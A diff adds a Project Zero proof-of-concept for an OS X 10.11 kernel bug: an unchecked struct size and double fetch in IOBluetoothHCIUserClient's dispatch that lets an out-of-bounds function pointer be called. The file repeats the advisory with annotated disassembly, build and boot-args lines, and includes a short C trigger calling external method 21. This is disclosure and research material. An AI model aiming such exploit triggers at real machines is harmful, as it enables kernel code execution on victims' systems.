@@ -1,0 +1,136 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=569
+
+IOBluetoothHCIUserClient uses an IOCommandGate to dispatch external methods; it passes a pointer to the structInput
+of the external method as arg0 and ::SimpleDispatchWL as the Action. It neither passes nor checks the size of that structInput,
+and SimpleDispatchWL goes on to read the field at +0x70 of the structInput:
+
+__text:00000000000118EB                 mov     esi, [rbx+70h]      <-- rbx is structInput, size never checked so +0x70 can be OOB
+__text:00000000000118EE                 test    esi, esi
+__text:00000000000118F0                 mov     r13d, 0E00002C7h
+__text:00000000000118F6                 js      loc_11C5B           <-- fail if negative
+__text:00000000000118FC                 lea     rdx, _sRoutineCount
+__text:0000000000011903                 cmp     esi, [rdx]
+__text:0000000000011905                 jge     loc_11C5B           <-- fail if >= number of routines
+
+This alone would be uninteresting, except that there is another fetch from rbx+0x70 which assumes the value hasn't changed:
+
+__text:0000000000011995                 movsxd  rax, dword ptr [rbx+70h] <-- fetch OOB again
+__text:0000000000011999                 mov     rcx, rax
+__text:000000000001199C                 shl     rcx, 4
+__text:00000000000119A0                 lea     rdx, _sRoutines
+__text:00000000000119A7                 mov     r14d, [rdx+rcx+8]
+__text:00000000000119AC                 cmp     r14d, 7
+__text:00000000000119B0                 mov     r13d, 0E00002C2h
+__text:00000000000119B6                 ja      loc_11C5B                <-- test that sRoutines[OOB].nParams is <= 7
+__text:00000000000119BC                 mov     rcx, [rdx+rcx]
+__text:00000000000119C0                 mov     [rbp+var_40], rcx        <-- save sRoutines[OOB].fptr into var_40
+
+the code then sets the required registers/stack entries for the number of parameters and calls var_40:
+
+__text:0000000000011B77                 mov     rdi, r15
+__text:0000000000011B7A                 call    [rbp+var_40]
+
+Therefore, by being able to change what follows the mach message corrisponding to this external method call in memory between the checks at +0x118eb
+and the second fetch at +0x11995 we can defeat the bounds check and get a function pointer read out of bounds and called.
+
+Tested on OS X ElCapitan 10.11 (15A284) on MacBookAir 5,2
+
+Strongly recommended to use the gazalloc boot args as shown above to repro this!
+*/
+
+// ianbeer
+// build: clang -o bluehci_oob_demux bluehci_oob_demux.c -framework IOKit
+// boot-args: debug=0x144 -v pmuflags=1 kdp_match_name=en3 gzalloc_min=100 gzalloc_max=300
+
+/*
+Lack of bounds checking in IOBluetoothHCIUserClient external method dispatching allows arbitrary kernel code execution
+
+IOBluetoothHCIUserClient uses an IOCommandGate to dispatch external methods; it passes a pointer to the structInput
+of the external method as arg0 and ::SimpleDispatchWL as the Action. It neither passes nor checks the size of that structInput,
+and SimpleDispatchWL goes on to read the field at +0x70 of the structInput:
+
+__text:00000000000118EB                 mov     esi, [rbx+70h]      <-- rbx is structInput, size never checked so +0x70 can be OOB
+__text:00000000000118EE                 test    esi, esi
+__text:00000000000118F0                 mov     r13d, 0E00002C7h
+__text:00000000000118F6                 js      loc_11C5B           <-- fail if negative
+__text:00000000000118FC                 lea     rdx, _sRoutineCount
+__text:0000000000011903                 cmp     esi, [rdx]
+__text:0000000000011905                 jge     loc_11C5B           <-- fail if >= number of routines
+
+This alone would be uninteresting, except that there is another fetch from rbx+0x70 which assumes the value hasn't changed:
+
+__text:0000000000011995                 movsxd  rax, dword ptr [rbx+70h] <-- fetch OOB again
+__text:0000000000011999                 mov     rcx, rax
+__text:000000000001199C                 shl     rcx, 4
+__text:00000000000119A0                 lea     rdx, _sRoutines
+__text:00000000000119A7                 mov     r14d, [rdx+rcx+8]
+__text:00000000000119AC                 cmp     r14d, 7
+__text:00000000000119B0                 mov     r13d, 0E00002C2h
+__text:00000000000119B6                 ja      loc_11C5B                <-- test that sRoutines[OOB].nParams is <= 7
+__text:00000000000119BC                 mov     rcx, [rdx+rcx]
+__text:00000000000119C0                 mov     [rbp+var_40], rcx        <-- save sRoutines[OOB].fptr into var_40
+
+the code then sets the required registers/stack entries for the number of parameters and calls var_40:
+
+__text:0000000000011B77                 mov     rdi, r15
+__text:0000000000011B7A                 call    [rbp+var_40]
+
+Therefore, by being able to change what follows the mach message corrisponding to this external method call in memory between the checks at +0x118eb
+and the second fetch at +0x11995 we can defeat the bounds check and get a function pointer read out of bounds and called.
+
+Tested on OS X ElCapitan 10.11 (15A284) on MacBookAir 5,2
+
+Strongly recommended to use the gazalloc boot args as shown above to repro this!
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <IOKit/IOKitLib.h>
+
+int main(int argc, char** argv){
+  kern_return_t err;
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }
+
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 1;
+  memset(inputStruct, 'A', inputStructCnt);
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0;
+  
+  err = IOConnectCallMethod(
+    conn,
+    21,
+    inputScalar,
+    inputScalarCnt,
+    inputStruct,
+    inputStructCnt,
+    outputScalar,
+    &outputScalarCnt,
+    outputStruct,
+    &outputStructCnt); 
+
+  return 0;
+}
